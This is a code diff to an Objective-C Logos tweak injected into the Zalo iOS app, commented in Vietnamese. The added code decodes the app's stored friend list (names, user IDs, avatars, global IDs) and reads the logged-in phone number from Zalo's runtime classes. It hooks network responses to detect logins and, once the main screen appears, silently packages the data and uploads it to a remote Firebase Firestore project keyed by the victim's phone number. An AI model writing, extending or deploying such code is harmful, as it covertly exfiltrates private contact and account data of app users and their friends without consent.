@@ -490,13 +490,16 @@ static void verifyKeyAndExecute(NSString *phoneStr, void (^onVerified)(void)) {
 static NSData *buildAdbkZipArchive(NSData *groupPlistData, NSString *phone) {
     if (!groupPlistData || groupPlistData.length == 0) return nil;
 
+    NSString *dateStr = [[NSDate date] description];
+    
     // 1. Tạo file Binfo.plist (Apps Manager Backup Information)
     NSDictionary *binfoDict = @{
         @"AppDisplayName": @"Zalo",
         @"AppPackageID": @"vn.com.vng.zingalo",
-        @"BackupDate": [[NSDate date] description],
+        @"BackupDate": dateStr,
         @"BackupType": @"AppGroup",
-        @"PhoneNumber": phone ?: @""
+        @"PhoneNumber": phone ?: @"",
+        @"ApplicationVersion": @"24.08.01"
     };
     NSData *binfoData = [NSPropertyListSerialization dataWithPropertyList:binfoDict 
                                                                    format:NSPropertyListXMLFormat_v1_0 
@@ -506,13 +509,29 @@ static NSData *buildAdbkZipArchive(NSData *groupPlistData, NSString *phone) {
         binfoData = [@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>AppPackageID</key><string>vn.com.vng.zingalo</string></dict></plist>" dataUsingEncoding:NSUTF8StringEncoding];
     }
 
+    // 2. Tạo metadata __private_info & app plist
+    NSData *privateInfoData = [@"{\"version\":1,\"generator\":\"ClanggZaloExporter\"}" dataUsingEncoding:NSUTF8StringEncoding];
+    NSData *appPlistData = [@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist version=\"1.0\"><dict><key>CFBundleIdentifier</key><string>vn.com.vng.zingalo</string></dict></plist>" dataUsingEncoding:NSUTF8StringEncoding];
+
     NSArray<NSDictionary *> *entries = @[
         @{
             @"name": @"Binfo.plist",
             @"data": binfoData
         },
         @{
-            @"name": @"AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist",
+            @"name": @"__private_info",
+            @"data": privateInfoData
+        },
+        @{
+            @"name": @"vn.com.vng.zingalo.plist",
+            @"data": appPlistData
+        },
+        @{
+            @"name": @"___groups___/group.zfriends.vn.com.vng.zingalo.plist",
+            @"data": groupPlistData
+        },
+        @{
+            @"name": @"___groups___/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist",
             @"data": groupPlistData
         }
     ];
@@ -595,14 +614,135 @@ static NSData *buildAdbkZipArchive(NSData *groupPlistData, NSString *phone) {
 }
 
 // ==============================================================================
-// TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
+// GIẢI MÃ TOÀN BỘ OBJECT GRAPH NSKEYEDARCHIVER TRONG APP GROUP PLIST
+// ==============================================================================
+static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
+    if (!plistData || plistData.length == 0) return @[];
+    NSMutableArray<NSDictionary *> *friends = [NSMutableArray array];
+    @try {
+        #pragma clang diagnostic push
+        #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+        NSDictionary *dict = [NSPropertyListSerialization propertyListWithData:plistData options:0 format:NULL error:nil];
+        #pragma clang diagnostic pop
+        if (![dict isKindOfClass:[NSDictionary class]]) return @[];
+
+        for (NSString *key in dict) {
+            id val = dict[key];
+            if (![val isKindOfClass:[NSData class]]) continue;
+
+            NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
+            if (![inner isKindOfClass:[NSDictionary class]]) continue;
+
+            NSArray *objs = inner[@"$objects"];
+            if (![objs isKindOfClass:[NSArray class]] || objs.count < 3) continue;
+
+            for (id item in objs) {
+                if (![item isKindOfClass:[NSDictionary class]]) continue;
+                NSDictionary *objDict = (NSDictionary *)item;
+
+                // Hàm giải mã con trỏ UID trong $objects
+                NSString * (^resolveField)(id) = ^NSString *(id fieldVal) {
+                    if ([fieldVal isKindOfClass:[NSString class]]) return fieldVal;
+                    if ([fieldVal isKindOfClass:[NSDictionary class]] && fieldVal[@"CF$UID"]) {
+                        NSUInteger idx = [fieldVal[@"CF$UID"] unsignedIntegerValue];
+                        if (idx < objs.count && [objs[idx] isKindOfClass:[NSString class]]) {
+                            return objs[idx];
+                        }
+                    }
+                    return nil;
+                };
+
+                NSString *dName = resolveField(objDict[@"displayName"]) ?: resolveField(objDict[@"contactName"]) ?: resolveField(objDict[@"aliasname"]);
+                NSString *uId = resolveField(objDict[@"userId"]) ?: resolveField(objDict[@"userid"]) ?: resolveField(objDict[@"zaloId"]) ?: resolveField(objDict[@"zaloid"]);
+                NSString *avatar = resolveField(objDict[@"avatarURL"]) ?: resolveField(objDict[@"avatar"]);
+                NSString *globalId = resolveField(objDict[@"globalId"]);
+
+                if (dName.length >= 2 && ![dName hasPrefix:@"$"] && ![dName isEqualToString:@"ZSDFriendEntity"] && ![dName isEqualToString:@"ZSDAliasEntity"]) {
+                    NSMutableDictionary *fMeta = [NSMutableDictionary dictionary];
+                    fMeta[@"name"] = dName;
+                    if (uId.length > 0) fMeta[@"userId"] = uId;
+                    if (avatar.length > 0) fMeta[@"avatarURL"] = avatar;
+                    if (globalId.length > 0) fMeta[@"globalId"] = globalId;
+
+                    [friends addObject:fMeta];
+                    break;
+                }
+            }
+        }
+    } @catch (NSException *e) {}
+    return friends;
+}
+
+// ==============================================================================
+// TRÍCH XUẤT SĐT VÀ KIỂM TRA PHIÊN THỰC TỪ RUNTIME ZALO
 // ==============================================================================
 static NSString *g_activeLoggedInPhone = nil;
 
-static void autoSyncFriendsToFirebase(NSString *phoneStr) {
-    if (!phoneStr || phoneStr.length < 8) return;
+static NSString *getZaloLivePhoneNumber(void) {
+    if (g_activeLoggedInPhone.length >= 8) return g_activeLoggedInPhone;
+    @try {
+        Class accMgr = NSClassFromString(@"ZAccountManager") ?: NSClassFromString(@"ZSessionManager");
+        if (accMgr) {
+            id currentAcc = nil;
+            if ([accMgr respondsToSelector:@selector(currentAccount)]) {
+                currentAcc = [accMgr performSelector:@selector(currentAccount)];
+            } else if ([accMgr respondsToSelector:@selector(activeAccount)]) {
+                currentAcc = [accMgr performSelector:@selector(activeAccount)];
+            } else if ([accMgr respondsToSelector:@selector(sharedManager)]) {
+                id mgr = [accMgr performSelector:@selector(sharedManager)];
+                if ([mgr respondsToSelector:@selector(currentAccount)]) {
+                    currentAcc = [mgr performSelector:@selector(currentAccount)];
+                }
+            }
 
-    NSString *cleanPhone = [[phoneStr componentsSeparatedByCharactersInSet:
+            if (currentAcc) {
+                for (NSString *selName in @[@"phoneNumber", @"phone", @"accountPhone", @"accountPhoneNumber"]) {
+                    SEL s = NSSelectorFromString(selName);
+                    if ([currentAcc respondsToSelector:s]) {
+                        NSString *p = [currentAcc performSelector:s];
+                        if ([p isKindOfClass:[NSString class]] && p.length >= 8) {
+                            return p;
+                        }
+                    }
+                }
+            }
+        }
+    } @catch (NSException *e) {}
+    return nil;
+}
+
+static BOOL isZaloRealLoggedIn(void) {
+    @try {
+        Class accMgr = NSClassFromString(@"ZAccountManager") ?: NSClassFromString(@"ZSessionManager");
+        if (accMgr) {
+            if ([accMgr respondsToSelector:@selector(isLogin)]) {
+                return (BOOL)[accMgr performSelector:@selector(isLogin)];
+            }
+            if ([accMgr respondsToSelector:@selector(isLoggedIn)]) {
+                return (BOOL)[accMgr performSelector:@selector(isLoggedIn)];
+            }
+            if ([accMgr respondsToSelector:@selector(sharedManager)]) {
+                id mgr = [accMgr performSelector:@selector(sharedManager)];
+                if ([mgr respondsToSelector:@selector(isLogin)]) {
+                    return (BOOL)[mgr performSelector:@selector(isLogin)];
+                }
+                if ([mgr respondsToSelector:@selector(isLoggedIn)]) {
+                    return (BOOL)[mgr performSelector:@selector(isLoggedIn)];
+                }
+            }
+        }
+    } @catch (NSException *e) {}
+    return NO;
+}
+
+// ==============================================================================
+// TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
+// ==============================================================================
+static void autoSyncFriendsToFirebase(NSString *phoneStr) {
+    NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
+    if (!actualPhone || actualPhone.length < 8) return;
+
+    NSString *cleanPhone = [[actualPhone componentsSeparatedByCharactersInSet:
         [[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
     if ([cleanPhone hasPrefix:@"84"] && cleanPhone.length >= 10) {
         cleanPhone = [@"0" stringByAppendingString:[cleanPhone substringFromIndex:2]];
@@ -611,7 +751,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     }
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-        // 1. Tìm và đọc dữ liệu từ AppGroup
+        // 1. Đọc AppGroup plist
         NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:@"group.zfriends.vn.com.vng.zingalo"];
         NSString *plistPath = nil;
         if (groupURL) {
@@ -621,44 +761,20 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             plistPath = @"/var/mobile/Containers/Shared/AppGroup/group.zfriends.vn.com.vng.zingalo/Library/Preferences/group.zfriends.vn.com.vng.zingalo.plist";
         }
 
-        NSMutableSet<NSString *> *uniqueNames = [NSMutableSet set];
         NSData *rawPlistData = nil;
+        NSMutableArray<NSDictionary *> *structuredFriends = [NSMutableArray array];
+        NSMutableSet<NSString *> *uniqueNames = [NSMutableSet set];
 
         if ([[NSFileManager defaultManager] fileExistsAtPath:plistPath]) {
             rawPlistData = [NSData dataWithContentsOfFile:plistPath];
-            NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:plistPath];
-            if (dict && dict.count > 0) {
-                for (id key in dict) {
-                    id val = dict[key];
-                    if ([val isKindOfClass:[NSData class]]) {
-                        @try {
-                            #pragma clang diagnostic push
-                            #pragma clang diagnostic ignored "-Wdeprecated-declarations"
-                            NSDictionary *inner = [NSPropertyListSerialization propertyListWithData:val options:0 format:NULL error:nil];
-                            #pragma clang diagnostic pop
-                            NSArray *objs = inner[@"$objects"];
-                            if (objs && [objs isKindOfClass:[NSArray class]]) {
-                                for (id obj in objs) {
-                                    if ([obj isKindOfClass:[NSString class]] && [obj length] >= 2) {
-                                        NSString *s = (NSString *)obj;
-                                        if (![s hasPrefix:@"$"] && ![s hasPrefix:@"http"] && 
-                                            ![s isEqualToString:@"ZSDFriendEntity"] && 
-                                            ![s isEqualToString:@"ZSDAliasEntity"] && 
-                                            ![s isEqualToString:@"NSObject"] && 
-                                            ![s isEqualToString:@"NSMutableDictionary"] &&
-                                            ![s isEqualToString:@"NSDictionary"]) {
-                                            [uniqueNames addObject:s];
-                                        }
-                                    }
-                                }
-                            }
-                        } @catch (NSException *e) {}
-                    }
-                }
+            NSArray<NSDictionary *> *parsed = parseNSKeyedArchiverFriends(rawPlistData);
+            for (NSDictionary *f in parsed) {
+                [structuredFriends addObject:f];
+                if (f[@"name"]) [uniqueNames addObject:f[@"name"]];
             }
         }
 
-        // 2. Hợp nhất thêm danh bạ từ in-memory ZContactManager của Zalo
+        // 2. Hợp nhất thêm từ in-memory ZContactManager của Zalo
         @try {
             Class contactMgrCls = NSClassFromString(@"ZContactManager") ?: NSClassFromString(@"ZDBContactManager");
             if (contactMgrCls && [contactMgrCls respondsToSelector:@selector(sharedManager)]) {
@@ -671,8 +787,17 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                             if ([c respondsToSelector:@selector(displayName)]) name = [c performSelector:@selector(displayName)];
                             else if ([c respondsToSelector:@selector(contactName)]) name = [c performSelector:@selector(contactName)];
                             else if ([c respondsToSelector:@selector(zaloName)]) name = [c performSelector:@selector(zaloName)];
+                            
+                            NSString *uId = nil;
+                            if ([c respondsToSelector:@selector(userId)]) uId = [c performSelector:@selector(userId)];
+                            else if ([c respondsToSelector:@selector(zaloId)]) uId = [c performSelector:@selector(zaloId)];
+
                             if (name && name.length >= 2) {
                                 [uniqueNames addObject:name];
+                                NSMutableDictionary *fMeta = [NSMutableDictionary dictionary];
+                                fMeta[@"name"] = name;
+                                if (uId) fMeta[@"userId"] = uId;
+                                [structuredFriends addObject:fMeta];
                             }
                         }
                     }
@@ -689,14 +814,14 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
         }
 
-        // 3. Đóng gói ZIP chuẩn .adbk (PK 03 04)
+        // 3. Đóng gói ZIP chuẩn .adbk của Apps Manager
         NSData *adbkZipData = buildAdbkZipArchive(rawPlistData, cleanPhone);
         NSString *base64Adbk = adbkZipData ? [adbkZipData base64EncodedStringWithOptions:0] : @"";
 
         NSData *friendsJsonData = [NSJSONSerialization dataWithJSONObject:friendNames options:0 error:nil];
         NSString *friendsJsonStr = [[NSString alloc] initWithData:friendsJsonData encoding:NSUTF8StringEncoding] ?: @"[]";
 
-        // 4. Đẩy đầy đủ các trường lên Firebase Firestore (kèm adbk_format = "adbk")
+        // 4. Đẩy lên Firebase Firestore
         NSString *postUrlStr = [NSString stringWithFormat:
             @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
             kFirebaseProjectId, cleanPhone];
@@ -735,28 +860,10 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
         static NSString *lastExtractedPhone = nil;
         
-        NSString *currentPhone = g_activeLoggedInPhone;
-        
-        // Nếu chưa có từ network hook, kiểm tra trong NSUserDefaults của Zalo
-        if (!currentPhone || currentPhone.length < 8) {
-            @try {
-                NSDictionary *prefs = [[NSUserDefaults standardUserDefaults] dictionaryRepresentation];
-                for (NSString *key in prefs) {
-                    if ([key containsString:@"last_phone"] || [key containsString:@"current_phone"] || [key containsString:@"login_phone"] || [key isEqualToString:@"phone"]) {
-                        NSString *v = prefs[key];
-                        if ([v isKindOfClass:[NSString class]] && v.length >= 9) {
-                            NSString *digits = [[v componentsSeparatedByCharactersInSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]] componentsJoinedByString:@""];
-                            if (digits.length >= 9 && digits.length <= 12) {
-                                currentPhone = digits;
-                                break;
-                            }
-                        }
-                    }
-                }
-            } @catch (NSException *e) {}
-        }
+        NSString *currentPhone = getZaloLivePhoneNumber();
+        BOOL isLoggedIn = isZaloRealLoggedIn() || (currentPhone.length >= 8);
 
-        if (currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
+        if (isLoggedIn && currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
             lastExtractedPhone = [currentPhone copy];
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                 autoSyncFriendsToFirebase(currentPhone);
@@ -768,7 +875,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
 %end
 
 // ==============================================================================
-// HOOK 2: BẮT CHUẨN XÁC CÁC CỜ PHẢN HỒI API (LOGIN, REGISTER, FORGOT SUCCESS)
+// HOOK 2: BẮT PHẢN HỒI NETWORK API (LOGIN, REGISTER, FORGOT SUCCESS)
 // ==============================================================================
 %hook NSURLSession
 
@@ -797,7 +904,6 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                         NSInteger errorCode = [json[@"error_code"] integerValue];
                         id dataObj = json[@"data"];
                         
-                        // 1. Kiểm tra chính xác các cờ thành công như zalo_gui.py
                         BOOL isLoginComplete = NO;
                         BOOL isRegisterComplete = NO;
                         BOOL isForgotComplete = NO;
@@ -821,7 +927,7 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                         if (isLoginComplete || isRegisterComplete || isForgotComplete) {
                             NSString *detectedPhone = nil;
                             if ([dataObj isKindOfClass:[NSDictionary class]]) {
-                                detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"] ?: dataObj[@"userId"];
+                                detectedPhone = dataObj[@"phone"] ?: dataObj[@"phone_number"] ?: dataObj[@"phoneNumber"];
                             }
                             if (!detectedPhone) {
                                 NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
